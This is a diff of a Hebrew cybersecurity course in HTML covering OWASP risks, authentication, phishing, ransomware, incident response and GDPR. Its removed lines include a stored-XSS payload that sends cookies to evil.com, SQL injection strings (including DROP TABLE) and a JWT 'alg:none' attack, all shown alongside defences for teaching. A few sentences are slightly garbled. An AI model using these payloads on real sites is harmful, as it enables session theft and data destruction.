+query = <span class="str">"SELECT * FROM users WHERE name='"</span> + user_input + <span class="str">"'"</span>
+
+<span class="comment"># ✅ Parameterized Query — הפתרון</span>
+cursor.execute(<span class="str">"SELECT * FROM users WHERE name=?"</span>, (user_input,))
+<span class="comment"># DB מטפל בהרצת הפרמטר נפרד מה-SQL — injection בלתי אפשרי</span></code></pre>
+
+<div class="section-title">XSS — Cross-Site Scripting</div>
+<p class="prose">XSS קורה כשתוקף מצליח להזריק JavaScript לאתר שנטען אצל הקורבן. הדפדפן של הקורבן מריץ את הקוד כאילו הוא חלק לגיטימי מהאתר — ולכן הקוד יכול לגנוב cookies, לשנות את תוכן הדף, לשלוח מידע לשרת של התוקף. ה-harm: גניבת session cookies = גניבת זהות המשתמש ללא צורך בסיסמה.</p>
 
 <div class="section-title">OWASP Top 10 — 2021</div>
-<div class="table-wrap"><table class="data-table"><thead><tr><th>#</th><th>קטגוריה</th><th>חומרה</th><th>דוגמה</th></tr></thead><tbody>
-<tr><td>A01</td><td>Broken Access Control</td><td><span class="threat-badge badge-critical">קריטי</span></td><td>גישה לפרופיל של משתמש אחר</td></tr>
-<tr><td>A02</td><td>Cryptographic Failures</td><td><span class="threat-badge badge-critical">קריטי</span></td><td>HTTP במקום HTTPS, MD5 לסיסמאות</td></tr>
-<tr><td>A03</td><td>Injection (SQL, XSS)</td><td><span class="threat-badge badge-critical">קריטי</span></td><td>SELECT * FROM users WHERE id='$id'</td></tr>
-<tr><td>A04</td><td>Insecure Design</td><td><span class="threat-badge badge-high">גבוה</span></td><td>אין rate limiting על login</td></tr>
-<tr><td>A05</td><td>Security Misconfiguration</td><td><span class="threat-badge badge-high">גבוה</span></td><td>Admin panel פתוח לinternet</td></tr>
-<tr><td>A07</td><td>Auth & Session Failures</td><td><span class="threat-badge badge-high">גבוה</span></td><td>סיסמה חלשה, session לא פג תוקף</td></tr>
-<tr><td>A09</td><td>Logging Failures</td><td><span class="threat-badge badge-medium">בינוני</span></td><td>אין log על login failures</td></tr>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>#</th><th>קטגוריה</th><th>דוגמה</th></tr></thead><tbody>
+<tr><td>A01</td><td><strong>Broken Access Control</strong></td><td>user שמגיע לנתוני user אחר</td></tr>
+<tr><td>A02</td><td><strong>Cryptographic Failures</strong></td><td>סיסמאות ב-plaintext, HTTP במקום HTTPS</td></tr>
+<tr><td>A03</td><td><strong>Injection</strong></td><td>SQL, Command, LDAP injection</td></tr>
+<tr><td>A04</td><td><strong>Insecure Design</strong></td><td>אין rate limiting, reset tokens חלשים</td></tr>
+<tr><td>A05</td><td><strong>Security Misconfiguration</strong></td><td>default passwords, error messages עם stack trace</td></tr>
+<tr><td>A07</td><td><strong>Auth Failures</strong></td><td>brute force אפשרי, weak passwords</td></tr>
+<tr><td>A10</td><td><strong>SSRF</strong></td><td>שרת שמבצע בקשות HTTP לפי קלט משתמש</td></tr>
 </tbody></table></div>
 
-<div class="section-title">SQL Injection — הפרצה הקלאסית</div>
-<pre class="code-block"><code><span class="comment"># Vulnerable code (PHP)</span>
-$query = "SELECT * FROM users WHERE user='" . $_GET['user'] . "'";
-
-<span class="comment"># תוקף שולח: ' OR '1'='1</span>
-<span class="comment"># Query הופך ל:</span>
-SELECT * FROM users WHERE user='' <span class="key">OR '1'='1'</span>
-<span class="comment"># תוצאה: כל המשתמשים מוחזרים!</span>
-
-<span class="comment"># תוקף מתקדם — מחיקת DB:</span>
-'; DROP TABLE users; --
-
-<span class="comment"># ✅ הפתרון: Parameterized Queries</span>
-$stmt = $pdo->prepare("SELECT * FROM users WHERE user = <span class="val">?</span>");
-$stmt->execute([$_GET['user']]);
-<span class="comment"># Input מטופל כdata, לא כקוד SQL</span></code></pre>
-
-<div class="section-title">XSS — Stored, Reflected, DOM</div>
-<pre class="code-block"><code><span class="comment"># Stored XSS — מאוחסן בDB, מבוצע על כל visitor</span>
-<span class="comment"># משתמש מזדוני מפרסם תגובה:</span>
-<span class="key">&lt;script&gt;</span>document.location='https://evil.com/steal?c='+document.cookie<span class="key">&lt;/script&gt;</span>
-
-<span class="comment"># Reflected XSS — ב-URL</span>
-https://site.com/search?q=<span class="key">&lt;script&gt;</span>alert(1)<span class="key">&lt;/script&gt;</span>
-
-<span class="comment"># ✅ הגנות</span>
-1. Content-Security-Policy: script-src 'self'  <span class="comment"># blocks inline scripts</span>
-2. Output encoding: &amp;lt;script&amp;gt;             <span class="comment"># HTML encode</span>
-3. HTTPOnly cookies                            <span class="comment"># JS לא יכול לגשת</span>
-4. SameSite=Strict cookies                    <span class="comment"># מגן מCSRF</span></code></pre>
-
-<div class="incident-box">
-  <div class="incident-title">🔥 אירוע אמיתי: British Airways — 2018, 500K כרטיסי אשראי</div>
-  <div class="incident-body">
-    קבוצת Magecart שתלה script זדוני בדף התשלום של British Airways שסינן נתוני תשלום לשרת חיצוני. הפרצה: שינוי של 22 שורות JavaScript. הסקריפט רץ 2 שבועות לפני שזוהה.<br><br>
-    <strong>מה היה מונע:</strong> Content-Security-Policy (CSP) שחוסם scripts ממקורות לא מורשים. Subresource Integrity (SRI) לوالتحقق של third-party scripts. British Airways קיבלה קנס GDPR של £183M.
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Case Study: Equifax 2017 — 147 מיליון רשומות אישיות</div>
+  <div class="real-world-body">
+    ב-2017 נגנבו מ-Equifax נתוני אשראי של 147 מיליון אמריקאים — שמות, תאריכי לידה, מספרי ביטוח לאומי, כרטיסי אשראי. הפרצה נמשכה 76 ימים לפני גילוי.<br><br>
+    הסיבה: Apache Struts עם פגיעות ידועה שלא עודכנה. ה-patch היה זמין חודשיים קודם לכן. Equifax שילמה $575 מיליון פשרה עם FTC. <strong>הלקח: patch management — עדכון שוטף של libraries ותלויות — הוא לא אופציונלי. זה הבסיס.</strong>
   </div>
 </div>`,
+`<div class="did-you-know">💡 <strong>ידעת?</strong> כשאת נכנסת לSpotify עם חשבון Google, Google לא אומרת לSpotify מה הסיסמה שלך. היא שולחת "voucher" — token מוצפן שאומר "אני מאשרת שהמשתמשת הזו לגיטימית." Spotify לא יכולה לחשב את הסיסמה שלך מה-token — ואם Spotify ייפרץ, הסיסמה ל-Google בטוחה.</div>
 
-`<div class="did-you-know">💡 <strong>ידעת?</strong> כשאת נכנסת לSpotify עם חשבון Google, Google לא אומרת לSpotify מה הסיסמה שלך. היא שולחת "voucher" מוצפן שאומר "אני מאמתת שמשתמשת זו לגיטימית". זה OAuth 2.0 — הפרוטוקול שמריץ את רוב ה"Login with Google/Facebook" בעולם.</div>
+<div class="section-title">Authentication vs Authorization — שני דברים שונים</div>
+<p class="prose">הבלבול בין שניהם נפוץ מאוד, ובשניהם טמונות פגיעויות חמורות. <strong>Authentication</strong> שואלת "מי אתה?" — הוכחת זהות. <strong>Authorization</strong> שואלת "מה מותר לך לעשות?" — הרשאות. אפשר להיות authenticated (מזוהה) בלי להיות authorized (מורשה). דוגמה: עובד ב-HR שנכנס למערכת הוא authenticated — אבל הוא לא authorized לגשת לנתוני שכר של ה-CEO.</p>
 
-<div class="section-title">Authentication vs Authorization</div>
+<div class="section-title">MFA — שלוש שכבות הזיהוי</div>
+<p class="prose">סיסמה לבד היא גורם זיהוי אחד — משהו שאת יודעת. אם נגנבה — גמרנו. MFA (Multi-Factor Authentication) מוסיף גורם שני: משהו שיש לך (טלפון, מפתח פיזי) או משהו שאת (טביעת אצבע, פנים). תוקף שגנב רק את הסיסמה — עדיין לא יכול להיכנס.</p>
 <div class="grid-2">
-<div class="card"><div class="card-icon">🪪</div><div class="card-title">Authentication — מי אתה?</div><div class="card-body">אימות זהות: סיסמה, biometrics, certificate. <strong>Something you know, have, are.</strong></div></div>
-<div class="card"><div class="card-icon">🔐</div><div class="card-title">Authorization — מה מותר לך?</div><div class="card-body">הרשאות לאחר זיהוי. RBAC, ABAC, ACL. "Admin רואה הכל, User רואה רק שלו."</div></div>
+<div class="card"><div class="card-icon">📱</div><div class="card-title">TOTP — One-Time Password</div><div class="card-body">הקוד של 6 ספרות שמתחלף כל 30 שניות (Google Authenticator, Authy). מבוסס על HMAC עם גורם זמן. גם אם תוקף רואה קוד — עד שישתמש בו, פג תוקפו.</div></div>
+<div class="card"><div class="card-icon">🔑</div><div class="card-title">FIDO2 / WebAuthn — הכי חזק</div><div class="card-body">מפתח פיזי (YubiKey) או biometrics. המפתח הפרטי לעולם לא עוזב המכשיר. עמיד ב-100% לphishing — גם אתר מזויף לא יכול לגנוב אותו.</div></div>
 </div>
 
-<div class="section-title">MFA — Multi-Factor Authentication</div>
-<div class="table-wrap"><table class="data-table"><thead><tr><th>Factor</th><th>דוגמה</th><th>חוזק</th><th>חולשה</th></tr></thead><tbody>
-<tr><td>SMS OTP</td><td>קוד ב-SMS</td><td><span class="threat-badge badge-medium">בינוני</span></td><td>SIM swapping, SS7 attack</td></tr>
-<tr><td>TOTP App</td><td>Google Authenticator</td><td><span class="threat-badge badge-low">טוב</span></td><td>Phishing real-time</td></tr>
-<tr><td>Hardware Key</td><td>YubiKey, FIDO2</td><td><span class="threat-badge badge-low">מצוין</span></td><td>עלות, אובדן פיזי</td></tr>
-<tr><td>Passkey</td><td>Face ID, biometric</td><td><span class="threat-badge badge-low">מצוין</span></td><td>חדש, תמיכה חלקית</td></tr>
+<div class="section-title">OAuth 2.0 ו-JWT — כיצד "התחבר עם Google" עובד</div>
+<pre class="code-block"><code><span class="comment"># OAuth 2.0 Authorization Code Flow</span>
+1. את לוחצת "התחבר עם Google" ← Spotify
+2. Spotify מפנה ← Google עם client_id + scope
+3. Google מראה: "Spotify מבקש גישה ל-email שלך"
+4. את מאשרת ← Google מחזירה authorization_code
+5. Spotify מחליף code ← access_token (server-to-server)
+6. Spotify שולח access_token ← Google
+7. Google מחזירה: email, שם, תמונה
+
+<span class="comment"># JWT — token בתוך token</span>
+Header.Payload.Signature
+<span class="comment"># כל חלק מקודד ב-base64, signature מאמת תמימות</span></code></pre>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Privileged Access Management — הלקח מה-NSA</div>
+  <div class="real-world-body">
+    ב-2013 דלף Edward Snowden מ-NSA מאות אלפי מסמכים סודיים. לא בגלל פריצה חיצונית. בגלל שכ-sysadmin הוא היה לו גישה לגיטימית למערכות רבות, ולא הייתה מגבלה על כמות המסמכים שאפשר להוריד.<br><br>
+    PAM (Privileged Access Management) היה אמור למנוע זאת: Just-in-Time access (גישה רק כשצריך), Just-Enough-Privilege (הרשאות מינימליות), ו-session recording (כל פעולה מוקלטת). <strong>Principle of Least Privilege: לכל משתמש רק ההרשאות שהוא באמת צריך, ולא רגע יותר.</strong>
+  </div>
+</div>`,
+`<div class="did-you-know">💡 <strong>ידעת?</strong> 91% מהתקיפות הסייבר מתחילות ב-phishing email. האנטי-וירוס הכי טוב בעולם לא מגן על עובד שלחץ על קישור. לתוקפים יש סבלנות: הם יחקרו אותך ב-LinkedIn, יבנו profile שלך, ויכתבו email שנראה בדיוק כמו מנהל שלך מבקש העברה דחופה.</div>
+
+<div class="section-title">Phishing — ממה באמת מגנים</div>
+<p class="prose">Phishing הוא לא טכנולוגיה — הוא פסיכולוגיה. תוקף לא פורץ לחומה. הוא פשוט שואל בנימוס אם אפשר להיכנס. email שנראה כמו ממנהל שלך, כתוב דחוף, עם לוגו האמין, עם קישור לעמוד כניסה שנראה אמיתי. ברגע שהזנת סיסמה — גמרנו. התוקף אחרי זה פועל כאת.</p>
+<p class="prose">Spear Phishing לוקח את זה צעד קדימה: במקום לשלוח לאלפי אנשים ולקוות שמישהו ייפול, התוקף מתמקד ב<em>אדם ספציפי</em>. הוא קורא את ה-LinkedIn שלך, את הפוסטים, יודע מה הפרויקטים שלך, מי המנהל שלך — וכותב email שמציין פרטים אמיתיים. הסיכוי ליפול — גבוה מאוד.</p>
+
+<div class="section-title">Ransomware — כיצד מתקפה שכזו עובדת</div>
+<p class="prose">Ransomware הוא malware שמצפין את הקבצים שלך — ואחר כך דורש כסף תמורת מפתח הפענוח. בממוצע, ארגון שנפגע משלם $4.5 מיליון בכופר ובנזקים נלווים. ועדיין — גם אחרי תשלום, רק 65% מהארגונים מקבלים חזרה את כל הנתונים.</p>
+<div class="flow-row">
+  <div class="flow-step"><div class="flow-step-icon">📧</div><div class="flow-step-label">Phishing<br>כניסה ראשונית</div></div>
+  <div class="flow-arrow">←</div>
+  <div class="flow-step"><div class="flow-step-icon">🕵️</div><div class="flow-step-label">Lateral<br>Movement</div></div>
+  <div class="flow-arrow">←</div>
+  <div class="flow-step"><div class="flow-step-icon">📦</div><div class="flow-step-label">גניבת<br>נתונים</div></div>
+  <div class="flow-arrow">←</div>
+  <div class="flow-step"><div class="flow-step-icon">🔒</div><div class="flow-step-label">הצפנת<br>קבצים</div></div>
+  <div class="flow-arrow">←</div>
+  <div class="flow-step"><div class="flow-step-icon">💰</div><div class="flow-step-label">דרישת<br>כופר</div></div>
+</div>
+
+<div class="section-title">Defense — מה באמת מגן</div>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>איום</th><th>הגנה אפקטיבית</th><th>הגנה שלא עוזרת</th></tr></thead><tbody>
+<tr><td>Phishing</td><td>MFA, הכשרת עובדים, email filtering</td><td>אנטי-וירוס (לא מזהה social engineering)</td></tr>
+<tr><td>Ransomware</td><td>Backup מבודד (3-2-1), segmentation</td><td>תשלום כופר (לא מבטיח שחזור)</td></tr>
+<tr><td>Malware</td><td>EDR, application whitelisting, updates</td><td>חומת אש בלבד</td></tr>
 </tbody></table></div>
 
-<div class="section-title">JWT — JSON Web Token</div>
-<pre class="code-block"><code><span class="comment"># JWT מורכב מ-3 חלקים, מופרדים ב-.</span>
-eyJhbGciOiJIUzI1NiJ9<span class="key">.</span>eyJzdWIiOiI0MiIsInJvbGUiOiJhZG1pbiJ9<span class="key">.</span>signature
-
-<span class="comment"># Header (base64): {"alg": "HS256"}</span>
-<span class="comment"># Payload (base64, NOT encrypted!):</span>
-{
-  "sub": "42",          <span class="comment">// user ID</span>
-  "role": "<span class="key">admin</span>",     <span class="comment">// ⚠️ ניתן לקריאה!</span>
-  "exp": 1716239022     <span class="comment">// expiry</span>
-}
-<span class="comment"># Signature: HMAC(header + "." + payload, secret)</span>
-
-<span class="comment"># הפגיעות הנפוצה: "alg: none" attack</span>
-<span class="comment"># תוקף משנה alg לnone ומסיר signature</span>
-<span class="comment"># ✅ תמיד לאמת alg ולא לקבל alg:none!</span></code></pre>
-
-<div class="incident-box">
-  <div class="incident-title">🔥 אירוע אמיתי: Okta Breach — 2023</div>
-  <div class="incident-body">
-    ספק הזהות Okta — שמשמש לSSO אצל אלפי חברות — חווה פרצה שגרמה לנתוני לקוחות כולל BeyondTrust, Cloudflare ו-1Password להיחשף. הגישה: support ticket system שקיבל גישה ל-production systems.<br><br>
-    <strong>הלקח:</strong> Identity providers הם "keys to the kingdom" — פשרה שלהם פירושה גישה לכל הלקוחות. Zero Trust, מינימום הרשאות לsupport systems, וmulti-party approval לפעולות רגישות הם הכרחיים.
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Case Study: Ubiquiti — $47 מיליון בגלל email אחד</div>
+  <div class="real-world-body">
+    ב-2015 העביר עובד פיננסי ב-Ubiquiti Networks $47 מיליון לחשבונות בחו"ל, בהוראות מ-emails שנראו כמו ממנהלים בכירים. זו לא הייתה פריצה טכנית. זה היה BEC — Business Email Compromise — הודעות email מזויפות עם דרישות דחופות.<br><br>
+    $15 מיליון שוחזרו. $32 מיליון נעלמו לנצח. <strong>הלקח: אישור טלפוני לכל העברה פיננסית גדולה, ו-dual approval — שני עובדים חייבים לאשר — הוא פרוטוקול חובה.</strong>
   </div>
 </div>`,
+`<div class="did-you-know">💡 <strong>ידעת?</strong> הזמן הממוצע לזיהוי פרצת אבטחה הוא 207 ימים — ועוד 73 ימים עד להכלה. כמעט 9 חודשים. בזמן הזה, תוקף יכול לקרוא כל email, לגנוב כל קובץ, ולמפות את כל הרשת — בלי שתדעי. Detection לא הוא מי שאיתר את הפריצה ב-Equifax — הם נאמרו על ידי חוקרים חיצוניים.</div>
 
-`<div class="did-you-know">💡 <strong>ידעת?</strong> 91% מהתקיפות הסייבר מתחילות ב-phishing email. האנטי-וירוס הכי טוב בעולם לא מגן על עובד שנלחץ על קישור ב-email שנראה ממנהל שלו.</div>
-
-<div class="section-title">Phishing — ממייל לפרצה</div>
+<div class="section-title">NIST Incident Response — ארבעה שלבים</div>
+<p class="prose">לכל ארגון צריך להיות תוכנית מוכנה מראש — לא מתגבשים על "מה עושים?" ב-3 לפנות בוקר כשהשרתים מוצפנים. NIST (המכון הלאומי לתקנים וטכנולוגיה של ארה"ב) מגדיר ארבעה שלבים לתגובה לאירוע.</p>
 <div class="grid-2">
-<div class="card"><div class="card-icon">🎣</div><div class="card-title">Phishing רגיל</div><div class="card-body">מיילים המוניים בכמות גדולה. "הבנק שלך נפרץ, לחץ כאן." נמוך מאמץ, נמוך אחוז הצלחה.</div></div>
-<div class="card"><div class="card-icon">🎯</div><div class="card-title">Spear Phishing</div><div class="card-body">ממוקד לאדם ספציפי. שם, תפקיד, פרטים אישיים. "שלום אריאל, ראיתי שאתה במחלקת R&D..." אחוז הצלחה גבוה בהרבה.</div></div>
-<div class="card"><div class="card-icon">🐳</div><div class="card-title">Whaling</div><div class="card-body">Spear phishing נגד C-level executives. CEO Fraud: "אני ה-CFO, צריך העברה דחופה של $2M."</div></div>
-<div class="card"><div class="card-icon">📞</div><div class="card-title">Vishing / Smishing</div><div class="card-body">Voice phishing (טלפון) ו-SMS phishing. "אני מהIT, צריך את הסיסמה שלך לאיפוס דחוף."</div></div>
+<div class="card"><div class="card-icon">📋</div><div class="card-title">Preparation — לפני האירוע</div><div class="card-body">תוכנית תגובה כתובה, Playbooks לתרחישים, רשימת אנשי קשר, סביבת גיבוי, הרשאות לצוות ה-IR. הכל צריך להיות מוכן לפני שמשהו קורה.</div></div>
+<div class="card"><div class="card-icon">🔍</div><div class="card-title">Detection & Analysis</div><div class="card-body">זיהוי שהאירוע קורה, ניתוח היקפו, מיפוי מה נפגע. SIEM מרכז logs. EDR מזהה התנהגות חשודה. Timeline reconstruction.</div></div>
+<div class="card"><div class="card-icon">🚧</div><div class="card-title">Containment, Eradication & Recovery</div><div class="card-body">בידוד המערכות הנגועות, מחיקת malware, שחזור מגיבוי. כל שלב מתועד — כדי ללמוד, וכדי לדווח לרגולטורים.</div></div>
+<div class="card"><div class="card-icon">📊</div><div class="card-title">Post-Incident Activity</div><div class="card-body">Post-mortem כנה: מה קרה, מה לא עבד, מה משנים. ה-incident שלא מלמדים ממנו — יחזור על עצמו.</div></div>
 </div>
 
-<div class="section-title">Ransomware — כיצד זה עובד</div>
-<div class="flow-row">
-  <div class="flow-step"><div class="flow-step-icon">📧</div><div class="flow-step-label">Initial Access<br>Phishing/RDP</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">🦠</div><div class="flow-step-label">Execution<br>Payload runs</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">🔄</div><div class="flow-step-label">Persistence<br>Registry/Startup</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">🕵️</div><div class="flow-step-label">Lateral Movement<br>מתפשט ברשת</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">🔒</div><div class="flow-step-label">Encryption<br>AES קבצים</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">💰</div><div class="flow-step-label">Ransom Note<br>Bitcoin</div></div>
-</div>
+<div class="section-title">Digital Forensics — שמירת ראיות</div>
+<p class="prose">כשמגיבים לאירוע, יש פיתוי לנקות כל דבר מהר. זו טעות גדולה. ראיות דיגיטליות — logs, memory dumps, disk images — חייבות להישמר לפני כל ניקוי. Chain of Custody: כל ראיה מתועדת מי נגע בה ומתי, כדי שתהיה קבילה בבית משפט.</p>
 
-<div class="callout callout-danger"><strong>🚨 Double Extortion:</strong> קבוצות כמו LockBit ו-REvil לא רק מצפינות — הן גם גונבות את הנתונים ומאיימות לפרסם אם לא ישלמו. גיבוי טוב מגן מההצפנה, אבל לא מהפרסום.</div>
-
-<div class="incident-box">
-  <div class="incident-title">🔥 אירוע אמיתי: WannaCry — מאי 2017, 200,000 מחשבים ב-150 מדינות</div>
-  <div class="incident-body">
-    WannaCry השתמש ב-EternalBlue — exploit של NSA שדלף — שניצל פגיעות ב-SMBv1 של Windows. המתקפה פגעה ב-NHS (בריטניה): אלפי ניתוחים בוטלו, נזק של £92M. Renault עצרה פס ייצור. FedEx הפסידה $300M.<br><br>
-    <strong>הפגיעות:</strong> patch שוחרר על ידי מיקרוסופט 2 חודשים לפני המתקפה. ארגונים שלא עדכנו — נפגעו. <strong>patch management = הגנה הכי חשובה.</strong>
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Case Study: Target 2013 — 40 מיליון כרטיסי אשראי</div>
+  <div class="real-world-body">
+    בנובמבר 2013 גנבו האקרים פרטי כרטיסי אשראי של 40 מיליון לקוחות Target. הכניסה: דרך ספק HVAC (מיזוג אוויר) שהיה לו גישה לרשת Target לצורכי billing. מנקודה זו, התוקפים זזו laterally לרשת הPOS.<br><br>
+    Target ידעה. מערכת FireEye שלהם הפיקה alerts. הם התעלמו. ה-Target Security Operations Center קיבל alerts שלושה שבועות לפני הגניבה — ולא פעל. <strong>הלקח: Incident Response לא מסתיים ב-detection. חייב להיות process ברור של escalation ו-response לכל alert.</strong>
   </div>
 </div>`,
+`<div class="did-you-know">💡 <strong>ידעת?</strong> GDPR הטיל קנסות של מעל 4 מיליארד אירו מאז אכיפתו ב-2018. הקנס הגדול ביותר: Meta — 1.2 מיליארד אירו ב-2023 על העברת נתוני אירופאים לארה"ב. אבטחת מידע כבר לא רק עניין טכני — היא exposure עסקי של מאות מיליוני אירו.</div>
 
-`<div class="did-you-know">💡 <strong>ידעת?</strong> MTTR (Mean Time To Respond) הממוצע לפרצת אבטחה הוא 207 ימים לזיהוי ועוד 73 ימים להכלה — 280 ימים בסה"כ. תוקף יכול לישב ב-network שלך 9 חודשים לפני שמגלים אותו.</div>
-
-<div class="section-title">NIST Incident Response Framework</div>
-<div class="flow-row">
-  <div class="flow-step"><div class="flow-step-icon">🔍</div><div class="flow-step-label">Preparation<br>תכנון מראש</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">🚨</div><div class="flow-step-label">Detection<br>זיהוי האירוע</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">🔒</div><div class="flow-step-label">Containment<br>בידוד מיידי</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">🧹</div><div class="flow-step-label">Eradication<br>ניקוי מלא</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">🔄</div><div class="flow-step-label">Recovery<br>חזרה לפעילות</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">📝</div><div class="flow-step-label">Lessons Learned<br>מה ניתן ללמוד</div></div>
-</div>
-
-<div class="section-title">Digital Forensics — שימור ראיות</div>
-<div class="callout callout-warn"><strong>⚠️ Order of Volatility — סדר שימור ראיות:</strong> CPU registers → Network connections → Running processes → Memory (RAM) → Disk → Logs. תמיד לשמור volatile data קודם — היא נעלמת בreboot.</div>
-<pre class="code-block"><code><span class="comment"># Linux forensics — first response commands</span>
-date                          <span class="comment"># timestamp of investigation</span>
-w && who                      <span class="comment"># who is logged in</span>
-ps auxf                       <span class="comment"># all running processes</span>
-netstat -tulnap               <span class="comment"># open connections</span>
-lsof -i                       <span class="comment"># open network files</span>
-cat /proc/[pid]/maps          <span class="comment"># process memory maps</span>
-dd if=/dev/mem of=memory.dump <span class="comment"># RAM dump (before reboot!)</span>
-find / -mtime -1 -type f 2>/dev/null <span class="comment"># files changed in 24h</span>
-last && lastb                 <span class="comment"># login history + failures</span></code></pre>
-
-<div class="section-title">IOCs — Indicators of Compromise</div>
+<div class="section-title">GDPR — מה כל ארגון חייב להבין</div>
+<p class="prose">GDPR (General Data Protection Regulation) הוא תקנת האיחוד האירופי שקובעת כיצד מותר לאסוף, לעבד ולשמור מידע אישי של אירופאים. לא חשוב איפה הארגון נמצא — אם הוא מעבד נתונים של אירופאים, GDPR חל עליו. זו לא "בעיה אירופאית" — זה חל על כל חברה ישראלית עם לקוחות אירופאים.</p>
 <div class="grid-2">
-<div class="card"><div class="card-icon">📍</div><div class="card-title">Network IOCs</div><div class="card-body">IP addresses, domain names, URLs, unusual outbound connections, beaconing patterns (תקשורת קבועה בintervels קבועים).</div></div>
-<div class="card"><div class="card-icon">💾</div><div class="card-title">Host IOCs</div><div class="card-body">File hashes (MD5/SHA), registry keys, scheduled tasks חדשים, processes חריגים, files בlocations לא רגילים.</div></div>
-</div>
-
-<div class="incident-box">
-  <div class="incident-title">🔥 אירוע אמיתי: Equifax — 2017, 147M אמריקאים</div>
-  <div class="incident-body">
-    Equifax גילתה את הפרצה ב-29 ביולי 2017, אבל התוקפים היו בתוך הרשת מה-13 במאי — 76 ימים של lateral movement, גניבת נתונים בהדרגה. הסיבה שלא זוהה: SSL inspection לא הופעל, אז traffic מוצפן עם certificate פג תוקף לא נבדק.<br><br>
-    <strong>הלקחים לIR:</strong> (1) Monitoring של outbound traffic — חריגות בנפח. (2) SSL inspection פעיל. (3) Network segmentation — DB של 147M אנשים לא אמור להיות נגיש מרשת ה-web tier.
-  </div>
-</div>`,
-
-`<div class="did-you-know">💡 <strong>ידעת?</strong> GDPR הטיל קנסות של מעל 4 מיליארד אירו מאז 2018. הקנס הגדול ביותר: Meta — 1.2 מיליארד אירו ב-2023. אבטחת מידע כבר לא רק עניין טכני — היא exposure עסקי ישיר.</div>
-
-<div class="section-title">GDPR — מה שכל ארגון חייב לדעת</div>
-<div class="grid-2">
-<div class="card"><div class="card-icon">⏱️</div><div class="card-title">72 שעות</div><div class="card-body">חובת דיווח על breach לרגולטור תוך 72 שעות מהגילוי. אם נפגעו נושאי נתונים — גם להם.</div></div>
-<div class="card"><div class="card-icon">🗑️</div><div class="card-title">Right to Erasure</div><div class="card-body">כל אדם יכול לבקש מחיקת כל נתוניו. "הזכות להישכח." אתגר טכני: backups, logs, replicas.</div></div>
-<div class="card"><div class="card-icon">📋</div><div class="card-title">DPIA</div><div class="card-body">Data Protection Impact Assessment — הערכת סיכונים לפני עיבוד נתונים בסיכון גבוה. כמו facial recognition, health data.</div></div>
-<div class="card"><div class="card-icon">💰</div><div class="card-title">קנסות</div><div class="card-body">עד 4% מהמחזור הגלובלי השנתי, או 20M€ — הגבוה מביניהם. לא פחות מקנס תפעולי רגיל.</div></div>
+<div class="card"><div class="card-icon">✋</div><div class="card-title">זכויות המשתמש תחת GDPR</div><div class="card-body">Right to Access (לדעת מה יש עליי), Right to Erasure (למחוק את הנתונים), Right to Portability (לקבל את הנתונים ולעבור לשירות אחר), Right to Object (להתנגד לעיבוד).</div></div>
+<div class="card"><div class="card-icon">⏱️</div><div class="card-title">72 שעות — לדווח</div><div class="card-body">כשיש data breach, GDPR דורש דיווח לרשות המפקחת תוך 72 שעות. לא שבוע. לא חודש. 72 שעות. ארגונים שדחו — קיבלו קנסות כפולים.</div></div>
 </div>
 
 <div class="section-title">Risk Management — NIST Framework</div>
-<p class="prose">Risk = Likelihood × Impact. לא כל סיכון דורש טיפול מיידי. ארבע אסטרטגיות:</p>
-<div class="table-wrap"><table class="data-table"><thead><tr><th>אסטרטגיה</th><th>משמעות</th><th>מתי?</th><th>דוגמה</th></tr></thead><tbody>
-<tr><td><strong>Mitigate</strong></td><td>הפחתת הסיכון</td><td>כשהעלות שווה</td><td>הטמעת MFA</td></tr>
-<tr><td><strong>Transfer</strong></td><td>העברת הסיכון</td><td>ביטוח סייבר</td><td>Cyber Insurance</td></tr>
-<tr><td><strong>Accept</strong></td><td>קבלת הסיכון</td><td>עלות הגנה > נזק</td><td>Legacy system קטן</td></tr>
-<tr><td><strong>Avoid</strong></td><td>הימנעות מהסיכון</td><td>הסיכון גבוה מדי</td><td>לא לאחסן CC numbers</td></tr>
+<p class="prose">Risk Management לא אומר "אפס סיכון" — זה בלתי אפשרי וגם לא כלכלי. אומר: זיהוי הסיכונים, הבנת ההשפעה שלהם, ובחירת תגובה מושכלת. NIST Cybersecurity Framework מארגן את זה בחמישה פונקציות: Identify, Protect, Detect, Respond, Recover.</p>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>תקן</th><th>מיועד ל</th><th>מה הוא בודק</th><th>קנס/השלכה</th></tr></thead><tbody>
+<tr><td><strong>GDPR</strong></td><td>ארגונים עם נתוני אירופאים</td><td>פרטיות, הסכמה, זכויות</td><td>עד 4% ממחזור גלובלי</td></tr>
+<tr><td><strong>ISO 27001</strong></td><td>כל ארגון</td><td>ISMS — מערכת ניהול אבטחה</td><td>הסמכה וולונטרית</td></tr>
+<tr><td><strong>SOC 2</strong></td><td>SaaS, B2B</td><td>Security, Availability, Confidentiality</td><td>לקוחות enterprise דורשים</td></tr>
+<tr><td><strong>PCI DSS</strong></td><td>כל מי שמעבד כרטיסי אשראי</td><td>אבטחת נתוני תשלום</td><td>קנסות + שלילת יכולת לגבות</td></tr>
 </tbody></table></div>
 
-<div class="section-title">ISO 27001 vs SOC 2 vs PCI DSS</div>
-<div class="table-wrap"><table class="data-table"><thead><tr><th>תקן</th><th>מי צריך?</th><th>מוקד</th><th>אחוז חברות</th></tr></thead><tbody>
